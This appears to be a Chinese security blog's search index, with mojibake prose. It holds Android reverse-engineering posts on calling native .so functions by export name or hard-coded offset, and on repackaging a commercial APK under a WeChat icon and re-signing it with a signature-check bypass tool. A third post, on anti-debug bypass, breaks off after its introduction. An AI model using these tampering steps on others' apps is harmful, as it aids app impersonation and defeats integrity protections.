<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Androidå¼ºè°ƒnativeå‡½æ•°çš„ä¸¤ç§æ–¹æ³•</title>
    <url>/2020/04/29/Android%E5%BC%BA%E8%B0%83native%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>åœ¨é€†å‘åˆ†æAPPçš„è¿‡ç¨‹ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°nativeå‡½æ•°è°ƒç”¨ï¼Œæœ‰äº›æ˜¯å¯ä»¥é€šè¿‡æ­£å¸¸çš„IDAåŠ¨æ€è°ƒè¯•åˆ†æå…¶å‡½æ•°é€»è¾‘ç®—æ³•ç­‰ï¼Œä½†æœ‰äº›å‡½æ•°ç”±äºå¤šçº¿ç¨‹é€ æˆè°ƒè¯•ä¸ä¾¿ï¼Œç”šè‡³ç”±äºollvmç­‰æ··æ·†é€ æˆé€†å‘å›°éš¾å°±éœ€è¦è‡ªè¡Œè°ƒç”¨nativeå‡½æ•°å®ç°æƒ³è¦çš„ç»“æœã€‚<br><a id="more"></a></p>
<h1 id="é€šè¿‡å¯¼å‡ºå‡½æ•°è°ƒç”¨nativeå‡½æ•°"><a href="#é€šè¿‡å¯¼å‡ºå‡½æ•°è°ƒç”¨nativeå‡½æ•°" class="headerlink" title="é€šè¿‡å¯¼å‡ºå‡½æ•°è°ƒç”¨nativeå‡½æ•°"></a>é€šè¿‡å¯¼å‡ºå‡½æ•°è°ƒç”¨nativeå‡½æ•°</h1><p>ä¸€èˆ¬æ™®é€šçš„nativeå‡½æ•°éƒ½æ˜¯æœ‰å¯¼å‡ºå‡½æ•°çš„ï¼Œå› æ­¤åªè¦æ‰¾åˆ°å¯¼å‡ºå‡½æ•°åå³å¯è°ƒç”¨è¯¥nativeå‡½æ•°ã€‚</p>
<h2 id="å¯»æ‰¾å¯¼å‡ºå‡½æ•°"><a href="#å¯»æ‰¾å¯¼å‡ºå‡½æ•°" class="headerlink" title="å¯»æ‰¾å¯¼å‡ºå‡½æ•°"></a>å¯»æ‰¾å¯¼å‡ºå‡½æ•°</h2><p>é¦–å…ˆåœ¨javaå±‚æ‰¾åˆ°nativeå‡½æ•°çš„è°ƒç”¨<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native1.jpg" alt=""></p>
<p>æ¥ä¸‹æ¥åœ¨soä¸­å¯¼å‡ºå‡½æ•°ä¸­è¯¥nativeå‡½æ•°</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
<h2 id="ç¼–å†™Android-APP"><a href="#ç¼–å†™Android-APP" class="headerlink" title="ç¼–å†™Android APP"></a>ç¼–å†™Android APP</h2><p>è‡ªå·±å†™ä¸€ä¸ªå¸¦æŒ‰é’®çš„APPï¼Œè°ƒç”¨è¯¥å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">public</span> Button button;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span></div><div class="line">		&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">	</div><div class="line">			System.loadLibrary(<span class="string">"Aes"</span>);</div><div class="line">	</div><div class="line">			<span class="keyword">try</span> </div><div class="line">			&#123;</div><div class="line">				button = (Button)findViewById(R.id.btn_test);</div><div class="line">				button.setOnClickListener(<span class="keyword">new</span> OnClickListener() </div><div class="line">				&#123;</div><div class="line">			</div><div class="line">					<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">					&#123;</div><div class="line">						<span class="keyword">try</span> </div><div class="line">						&#123;</div><div class="line">							String encrypt = Aes.aesEncode(<span class="string">"12345"</span>,</div><div class="line">									<span class="string">"350710466385995"</span>);</div><div class="line">							</div><div class="line">							<span class="keyword">if</span> (<span class="keyword">null</span> != encrypt) </div><div class="line">							&#123;</div><div class="line">		</div><div class="line">								Log.d(<span class="string">"bbk"</span>,<span class="string">"encrypt:"</span> + encrypt);</div><div class="line">							&#125;</div><div class="line">							<span class="keyword">else</span> </div><div class="line">							&#123;</div><div class="line">								Log.d(<span class="string">"bbk"</span>, <span class="string">"encrypt is NULL"</span>);</div><div class="line">							&#125;	</div><div class="line">						</div><div class="line">						&#125; </div><div class="line">						<span class="keyword">catch</span> (Exception e) </div><div class="line">						&#123;</div><div class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">							&#123;</div><div class="line">								Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">							&#125;</div><div class="line">						&#125; </div><div class="line">						</div><div class="line">					&#125;</div><div class="line">				&#125;);</div><div class="line">		</div><div class="line">			&#125; </div><div class="line">			<span class="keyword">catch</span> (Exception e) </div><div class="line">			&#123;</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">				&#123;</div><div class="line">					Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">				&#125;</div><div class="line">			&#125;  </div><div class="line">			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>æ¨¡æ‹ŸåŸAPPè°ƒç”¨ç±»è°ƒç”¨nativeå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Aes</span> </span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">aesEncode</span><span class="params">(String str, String str2)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="jnié…ç½®"><a href="#jnié…ç½®" class="headerlink" title="jnié…ç½®"></a>jnié…ç½®</h2><p>å°†libAes.soåŠå…¶ä¾èµ–åº“libstlport.shared.soæ”¾å…¥jniç›®å½•ï¼Œå¹¶ç¼–å†™mkæ–‡ä»¶é…ç½®ã€‚</p>
<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := Aes</div><div class="line">LOCAL_SRC_FILES := libAes.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := stlport_shared</div><div class="line">LOCAL_SRC_FILES := libstlport_shared.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := my_objectname</div><div class="line">LOCAL_SRC_FILES := my_objectname.cpp</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
<h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div></pre></td></tr></table></figure>
<h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>é‡Œé¢å†™#include<jni.h>å³å¯</jni.h></p>
<p>æœ€åå°†APPå®‰è£…åˆ°æ‰‹æœºä¸Šè¿è¡Œå³å¯è¾“å‡ºè°ƒç”¨ç»“æœ</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
<h1 id="é€šè¿‡å‡½æ•°åœ°å€è°ƒç”¨nativeå‡½æ•°"><a href="#é€šè¿‡å‡½æ•°åœ°å€è°ƒç”¨nativeå‡½æ•°" class="headerlink" title="é€šè¿‡å‡½æ•°åœ°å€è°ƒç”¨nativeå‡½æ•°"></a>é€šè¿‡å‡½æ•°åœ°å€è°ƒç”¨nativeå‡½æ•°</h1><p>åœ¨é€†å‘è¿‡ç¨‹ä¸­è¿˜ä¼šé‡åˆ°å¾ˆå¤šAPPåŠ¨æ€æ³¨å†Œnativeå‡½æ•°ï¼Œç”šè‡³æ˜¯å°†å¯¼å‡ºå‡½æ•°éšè—çš„ï¼Œå°±æ— æ³•ä½¿ç”¨ä¸Šè¿°çš„è°ƒç”¨æ–¹æ¡ˆäº†ï¼Œæœ¬æ–¹æ¡ˆæ˜¯é€šè¿‡å‡½æ•°åœ°å€æ¥è°ƒç”¨nativeå‡½æ•°ï¼Œç†è®ºä¸Šåªè¦æ‰¾å¾—åˆ°nativeå‡½æ•°åœ¨soä¸­çš„åœ°å€å°±å¯ä»¥å®ç°è°ƒç”¨ã€‚</p>
<h2 id="å¯»æ‰¾nativeå‡½æ•°åœ°å€"><a href="#å¯»æ‰¾nativeå‡½æ•°åœ°å€" class="headerlink" title="å¯»æ‰¾nativeå‡½æ•°åœ°å€"></a>å¯»æ‰¾nativeå‡½æ•°åœ°å€</h2><p>åœ¨javaå±‚æ‰¾åˆ°nativeå‡½æ•°ï¼Œç¡®å®šå…¶ä¼ å…¥å‚æ•°ç±»å‹åŠä¸ªæ•°</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native4.jpg" alt=""></p>
<p>kxtmpå‡½æ•°æ˜¯åŠ¨æ€æ³¨å†Œå‡½æ•°ï¼Œç°åœ¨å­—ç¬¦ä¸²ä¸­æœç´¢å‡½æ•°åï¼Œä¹‹åé€šè¿‡å›æº¯æ‰¾åˆ°å‡½æ•°æ³¨å†Œåœ°å€</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native5.jpg" alt=""></p>
<h2 id="ç¼–å†™è°ƒç”¨so"><a href="#ç¼–å†™è°ƒç”¨so" class="headerlink" title="ç¼–å†™è°ƒç”¨so"></a>ç¼–å†™è°ƒç”¨so</h2><p>æœ¬æ–¹æ¡ˆä¸»è¦æ˜¯é€šè¿‡è‡ªå·±ç¼–å†™çš„soè°ƒç”¨nativeå‡½æ•°æ‰€åœ¨çš„soï¼Œè‡ªå·±çš„soåä¸ºhookso<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">			</div><div class="line">			System.loadLibrary(<span class="string">"hookso"</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">float</span> value =TypedValue.complexToFloat(<span class="number">55297</span>);</div><div class="line">			Log.e(<span class="string">"DEBUG"</span>, <span class="string">": "</span> + value);</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">			<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></div><div class="line">			getMenuInflater().inflate(R.menu.main, menu);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">			<span class="comment">// Handle action bar item clicks here. The action bar will</span></div><div class="line">			<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></div><div class="line">			<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></div><div class="line">			<span class="keyword">int</span> id = item.getItemId();</div><div class="line">			<span class="keyword">if</span> (id == R.id.action_settings) &#123;</div><div class="line">				JNI.testfunc();</div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNI</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testfunc</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="jnié…ç½®-1"><a href="#jnié…ç½®-1" class="headerlink" title="jnié…ç½®"></a>jnié…ç½®</h2><h3 id="Android-mk-1"><a href="#Android-mk-1" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"></div><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := hookso</div><div class="line">LOCAL_SRC_FILES := hookso.cpp</div><div class="line"></div><div class="line">LOCAL_LDLIBS += -llog  #<span class="built_in">log</span></div><div class="line"></div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
<h3 id="Application-mk-1"><a href="#Application-mk-1" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div><div class="line">APP_STL := c++<span class="number">_</span>shared</div><div class="line">APP_CPPFLAGS := -fexceptions -frtti</div></pre></td></tr></table></figure>
<h3 id="hookso-cpp"><a href="#hookso-cpp" class="headerlink" title="hookso.cpp"></a>hookso.cpp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/un.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">u_int32_t</span> <span class="params">(*<span class="keyword">common_func_t</span>)</span><span class="params">(<span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"DEBUG"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(lvl, fmt, args...) __android_log_print(lvl, \</span></div><div class="line">		LOG_TAG, fmt, ##args)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></div><div class="line">&#123;</div><div class="line">    FILE* fp;</div><div class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> *pch;</div><div class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</div><div class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(pid &lt;= <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</div><div class="line">    &#125;</div><div class="line">    fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(fgets(line, <span class="keyword">sizeof</span>(line), fp))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line, module_name))</div><div class="line">            &#123;</div><div class="line">                pch = strtok(line, <span class="string">"-"</span>);</div><div class="line">                addr = strtoul(pch, <span class="literal">NULL</span>, <span class="number">16</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        fclose(fp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">string</span> str = <span class="string">"1"</span>;</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"Java_com_example_hookso_JNI_testfunc: %s\n"</span>, str.c_str());</div><div class="line">	<span class="keyword">void</span> *cs_handle = dlopen(<span class="string">"/data/local/tmp/native.so"</span>, RTLD_NOW);</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] dlerror : %s"</span>, dlerror());</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] cs_handle: %p"</span>, cs_handle);</div><div class="line"><span class="comment">//å¯¼å‡ºç”¨ä¸‹é¢è¿™ä¸€å¥</span></div><div class="line"><span class="comment">//	void *cs_open_func = dlsym(cs_handle, "å¯¼å‡ºå‡½æ•°name");</span></div><div class="line"></div><div class="line">	<span class="keyword">u_int32_t</span> addr1 = (<span class="keyword">u_int32_t</span>)get_module_base(<span class="number">0</span>, <span class="string">"ntiave.so"</span>);</div><div class="line">	<span class="comment">//armæŒ‡ä»¤ä¸åŠ 1 0ï¼ŒthumbæŒ‡ä»¤åŠ 1 1</span></div><div class="line">	addr1 += <span class="number">0x0000ABD4</span>;</div><div class="line">	<span class="keyword">common_func_t</span> func = (<span class="keyword">common_func_t</span>)addr1;</div><div class="line"></div><div class="line">	jstring key = env-&gt;NewStringUTF(<span class="string">"1"</span>);</div><div class="line"><span class="comment">//	jstring str = env-&gt;NewStringUTF("qazwsxedcrfvtgbh64as65d465wq6d54a6s54d98aw4d65a4sd64qw6f46a4s9fd8d");</span></div><div class="line"></div><div class="line">	jstring ret1 = (jstring)func((<span class="keyword">u_int32_t</span>)env, <span class="number">0</span>, (<span class="keyword">u_int32_t</span>)key, <span class="number">0</span>);</div><div class="line"><span class="comment">//	jstring ret1 = (jstring)func((u_int32_t)env, 0, 0, 0);</span></div><div class="line"></div><div class="line">	LOGD(ANDROID_LOG_DEBUG, <span class="string">"[+] test_jstr: %s, size: %d"</span>, env-&gt;GetStringUTFChars((jstring)ret1, <span class="literal">false</span>), env-&gt;GetStringUTFLength((jstring)ret1));</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Tools</tag>
        <tag>eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>Androidé‡æ‰“åŒ…ç­¾åå®ä¾‹</title>
    <url>/2021/04/06/Android%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<p>ä¹‹å‰æœ‰è¯•è¿‡é‡æ‰“åŒ…APKï¼Œæ˜¯æ¯”è¾ƒç®€å•çš„ä¸€äº›demoï¼Œä¸€è·¯é¡ºé£ï¼Œä»Šå¤©åœ¨å°è¯•ä¸€æ¬¾å•†ä¸šAPPçš„é‡æ‰“åŒ…ç­¾åè¿‡ç¨‹ä¸­ï¼Œå‡ºç°äº†ä¸€äº›åï¼Œè®°å½•ä¸€ä¸‹ã€‚<br><a id="more"></a></p>
<h2 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h2><p>åç¼–è¯‘ä¸å¤šè¯´äº†ï¼ŒAPKå¹¶æ²¡æœ‰åŠ å›ºï¼ŒåŠ å›ºçš„è¯å°±éœ€è¦ä¿®å¤ä¹‹åæ‰èƒ½æ‰“åŒ…ç­¾åäº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">java -jar apktool_2.5.0.jar d xx.apk</div></pre></td></tr></table></figure>
<h2 id="ä¿®æ”¹iconåŠapp-name"><a href="#ä¿®æ”¹iconåŠapp-name" class="headerlink" title="ä¿®æ”¹iconåŠapp_name"></a>ä¿®æ”¹iconåŠapp_name</h2><p>app_nameåœ¨AndroidManifest.xmlä¸­ï¼Œå°†android:labelé¡¹æ”¹ä¸ºâ€œå“ˆå“ˆâ€ï¼Œä¹‹ååœ¨åç¼–è¯‘ä¹‹åçš„resä¸­ï¼Œå°†æ‰€æœ‰çš„mipmapç›¸å…³æ–‡ä»¶å¤¹ä¸­çš„å›¾æ ‡å…¨éƒ¨æ›¿æ¢ä¸ºå¾®ä¿¡å›¾æ ‡ã€‚</p>
<h2 id="é‡æ‰“åŒ…"><a href="#é‡æ‰“åŒ…" class="headerlink" title="é‡æ‰“åŒ…"></a>é‡æ‰“åŒ…</h2><p>è¿™é‡Œé‡æ‰“åŒ…å‡ºç°ä¸¤ä¸ªé—®é¢˜å¯¼è‡´å¤±è´¥<br>ç¬¬ä¸€ä¸ªé—®é¢˜å¦‚ä¸‹ï¼š<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">AndroidManifest.xml:<span class="number">1</span>: error: No resource identifier found <span class="keyword">for</span> attribute <span class="string">'compileSdkVersion'</span> in <span class="keyword">package</span> <span class="string">'android'</span></div><div class="line">AndroidManifest.xml:<span class="number">1</span>: error: No resource identifier found <span class="keyword">for</span> attribute <span class="string">'compileSdkVersionCodename'</span> in <span class="keyword">package</span> <span class="string">'android'</span></div></pre></td></tr></table></figure></p>
<p>æŠ¥é”™çš„åŸå› æ˜¯åœ¨ç¼–è¯‘æ—¶compileSdkVersionç‰ˆæœ¬è¿‡é«˜å¯¼è‡´çš„ã€‚<br>ç½‘ä¸ŠæŸ¥æ‰¾è§£å†³åŠæ³•æœ‰çš„è¯´å‡çº§apktoolså³å¯è§£å†³ï¼Œæˆ‘æŠŠä¹‹å‰çš„2.2.4å‡çº§åˆ°æœ€æ–°çš„2.5.0å¹¶æ²¡æœ‰è§£å†³ï¼Œpassï¼Œæ­£ç¡®çš„è§£å†³æ–¹æ¡ˆï¼Œæˆ‘ä»¬åœ¨å›ç¼–è¯‘è¿‡ç¨‹ä¸­åªéœ€è¦æ–°å»ºä¸€ä¸ªç©ºæ–‡ä»¶å¤¹</p>
<pre><code>mkdir framework
</code></pre><p>ç„¶åä½¿ç”¨Apktoolsé‡æ‰“åŒ…APK</p>
<pre><code>java -jar apktool_2.5.0.jar b xx -p framework -o xx_new.apk
</code></pre><p>ç¬¬äºŒä¸ªé—®é¢˜ï¼š</p>
<pre><code>Error: Integer types not allowed (at &apos;foregroundServiceType&apos; with value &apos;0x00000008&apos;).
</code></pre><p>è¿™ä¸ªé”™è¯¯ä¸»è¦æ˜¯ç”±äºandroid:foregroundServiceTypeé¡¹å¯¹åº”çš„valueæœ‰é—®é¢˜ï¼Œå°†0x00000008ä¿®æ”¹ä¸ºmediaProjectionå³å¯ã€‚è¿™æ ·æœ€ç»ˆå³å¯æ‰“åŒ…ä¸ºå®Œæ•´çš„APKã€‚</p>
<h2 id="ç­¾å"><a href="#ç­¾å" class="headerlink" title="ç­¾å"></a>ç­¾å</h2><p>ç­¾åå°±ä¸å¾—ä¸æä¸€ä¸ªé‡ç­¾åç¥å™¨ApkSignatureKillerã€‚<br>githubåœ°å€ä¸º<a href="https://github.com/L-JINBIN/ApkSignatureKiller" target="_blank" rel="external">https://github.com/L-JINBIN/ApkSignatureKiller</a></p>
<p>ä½¿ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œå°†éœ€è¦æå–ç­¾åçš„åŸxx.apk,æ‰“åŒ…ä¹‹åçš„new_xx.apk,å’Œç­¾åè¾“å‡ºçš„out_xx.apkå†™åœ¨å¯¹åº”ä½ç½®è¿è¡Œrun.batå³å¯ã€‚</p>
<pre><code># è·å–ç­¾åä¿¡æ¯
apk.signed=xx.apk

# è¦å¤„ç†çš„APK
apk.src=new_xx.apk

# å†™å‡ºçš„APKå
apk.out=out_xx.apk

# ç­¾åé…ç½®
sign.enable=true
sign.file=test.keystore
sign.password=123456
sign.alias=user
sign.aliasPassword=654321
</code></pre><p>æœ€ç»ˆç­¾åæˆåŠŸåçš„APKé•¿è€…å¾®ä¿¡å›¾æ ‡ï¼Œåå­—å«åšå“ˆå“ˆã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Sign1.png" alt=""></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>é‡æ‰“åŒ…</tag>
        <tag>ç­¾å</tag>
      </tags>
  </entry>
  <entry>
    <title>AntiAntiDebugåŠ©æ‰‹</title>
    <url>/2021/06/28/AntiAntiDebug%E5%8A%A9%E6%89%8B/</url>
    <content><![CDATA[<p>ä¹‹å‰æœ‰å†™è¿‡é’ˆå¯¹iOSåè°ƒè¯•çš„åŠå…¶ç»•è¿‡çš„åˆ†ææ–‡ç« ï¼Œ<a href="https://yunnigu.dropsec.xyz/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/">åŠ¨æ€ç»•è¿‡iOSå†…è”svcåè°ƒè¯•</a>ï¼Œæœ¬ç¯‡ä¸»è¦åˆ†äº«ä¸€ä¸‹è‡ªå·±é›†æˆçš„ä¸€æ¬¾æ–¹ä¾¿ç»•è¿‡åè°ƒè¯•çš„å·¥å…·ã€‚<br><a id="more"></a></p>
